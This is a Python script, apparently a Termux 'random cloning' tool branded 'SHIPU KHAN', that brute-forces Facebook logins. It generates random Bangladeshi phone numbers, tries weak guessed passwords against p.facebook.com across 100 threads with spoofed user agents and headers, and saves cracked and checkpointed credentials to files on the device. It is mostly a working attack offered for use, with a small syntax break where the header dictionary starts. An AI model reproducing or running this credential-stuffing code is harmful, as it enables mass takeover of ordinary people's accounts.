import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['Nokia-G10' , 'SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y' , 'INFINIX'])
      c='Build/SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)  
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android 12'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['Nokia-G10' , 'SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y' , 'INFINIX'])
      c='Build/Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)  
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system("espeak \"well come,to Shipu Khan termux Random Cloning \"")
logo = (f"""

:'######::'##::::'##:'####:'########::'##::::'##:
'##... ##: ##:::: ##:. ##:: ##.... ##: ##:::: ##:
 ##:::..:: ##:::: ##:: ##:: ##:::: ##: ##:::: ##:
. ######:: #########:: ##:: ########:: ##:::: ##:
:..... ##: ##.... ##:: ##:: ##.....::: ##:::: ##:
'##::: ##: ##:::: ##:: ##:: ##:::::::: ##:::: ##:
. ######:: ##:::: ##:'####: ##::::::::. #######::
:......:::..:::::..::....::..::::::::::.......:::                                                 
\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM & 𝐂𝐄𝐎   : SHIPU-KHAN-TERMUX-COMMMAND 
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM OWNER   : SHIPU KHAN
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;35m1.0                   
\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def TANJID():
    os.system('clear')
    os.system('xdg-open https://t.me/skmahmud77')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;31mEXIT")
    print(f"\033[1;31m===================")
    print("")
    SHOAIB = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if SHOAIB in ["1"]:
        main()
    if SHOAIB in ["2"]:
        os.system('exit')
def main():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m BD SIM CODE ➤[016•017•018•019]')
    nude = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/shipukhan72')
    print(logo)
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print ('\033[1;31m==================================================           ')
    limit = int(input('[•] YOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as SHOAIB:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mSIM CODE  : '+nude)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;33mTOTAL IDS : \033[1;92m'+tl)
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m[ON-OFF] AEROPLANE MODE ")
        print('\033[1;32m='*50)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','i love free fire']
            SHOAIB.submit(rcrack,uid,pwx,tl)
    print ('\033[1;31m==================================================           ')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print ('\033[1;31m==================================================           ')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sTANJID-BD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =
    {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"22111317PI"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[1;33m[SHIPU-OK🥰] {uid} • {ps}")
                os.system("espeak \"OK, ID \"")
                open('/sdcard/SHIPU-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;32m[SHIPU-CP😔] \033[1;31m{uid} • {ps}")
                #os.system("espeak \"CP, ID \"")
                open('/sdcard/SHIPU-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
        
TANJID()
